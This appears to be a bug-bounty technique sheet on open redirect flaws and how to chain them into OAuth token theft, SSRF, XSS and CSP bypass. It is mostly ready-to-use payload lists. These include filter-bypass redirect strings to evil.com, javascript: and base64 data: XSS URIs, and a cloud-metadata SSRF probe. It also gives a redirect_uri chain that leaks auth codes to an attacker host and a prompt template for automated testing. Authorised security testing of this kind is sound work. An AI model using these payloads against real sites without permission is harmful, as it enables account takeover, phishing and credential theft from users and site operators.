---
id: "open-redirect"
title: "Open Redirect - Chains & Escalation"
type: "technique"
category: "web-application"
subcategory: "open-redirect"
tags: ["open-redirect", "redirect", "oauth", "ssrf", "phishing", "chain", "deep-dig"]
difficulty: "beginner"
platforms: ["linux", "macos", "windows"]
related: ["account-takeover", "ssrf-techniques", "csrf-modern"]
updated: "2026-03-30"
---

## Overview

Open redirects let attackers redirect users to malicious sites via a trusted domain. Alone they're low severity ($50-$500), but chained they unlock OAuth token theft, SSRF, CSP bypass, and CSRF — pushing payouts to $2k-$10k+.

## Payloads

```
# Basic
?url=https://evil.com
?next=https://evil.com
?redirect=https://evil.com
?return=https://evil.com
?goto=https://evil.com
?dest=https://evil.com
?continue=https://evil.com
?rurl=https://evil.com
?target=https://evil.com

# Filter bypasses
?url=//evil.com
?url=\/\/evil.com
?url=https:evil.com
?url=https://target.com@evil.com
?url=https://evil.com#target.com
?url=https://evil.com%23target.com
?url=https://evil.com?target.com
?url=https://target.com.evil.com
?url=https://evil.com/target.com
?url=%68%74%74%70%73%3a%2f%2fevil.com  # URL encoded
?url=//evil%E3%80%82com  # Fullwidth dot
?url=https://evil。com   # Unicode dot
?url=data:text/html,<script>alert(1)</script>
?url=javascript:alert(1)
?url=//0x7f000001  # Decimal IP for 127.0.0.1
```

## Common Redirect Parameters

```
url, redirect, next, return, rurl, dest, destination, redir,
redirect_uri, redirect_url, return_url, return_to, goto, go,
continue, target, link, out, view, ref, callback, forward, path
```

## Escalation Chains

### Open Redirect → OAuth Token Theft
```
1. Find open redirect on target.com
2. Set OAuth redirect_uri to the open redirect:
   redirect_uri=https://target.com/redirect?url=https://evil.com
3. OAuth sends auth code to target.com (passes validation)
4. Target.com redirects to evil.com WITH the auth code
5. Attacker exchanges code for access token
```

### Open Redirect → SSRF
```
# If the server follows the redirect:
?url=http://169.254.169.254/latest/meta-data/
# Server fetches the URL, follows redirect to metadata endpoint
```

### Open Redirect → XSS
```
# javascript: protocol in redirect
?url=javascript:alert(document.domain)
# data: URI
?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### Open Redirect → CSP Bypass
```
# If CSP trusts target.com, redirect to attacker-hosted script
<script src="https://target.com/redirect?url=https://evil.com/xss.js"></script>
```

## Deep Dig Prompts

```
Given this application [describe]:
1. Find all parameters that accept URLs (search for redirect, url, next, return, etc.).
2. Test each with //evil.com and filter bypass variants.
3. If open redirect exists, chain with: OAuth redirect_uri, SSRF, or CSP bypass.
4. Test javascript: and data: URIs for XSS escalation.
5. Check server-side redirects (302 via API) for SSRF potential.
```

## Tools

- **OpenRedireX** — Automated open redirect testing
- **Burp Suite** — Parameter discovery and testing
- **Paramspider** — Find URL parameters
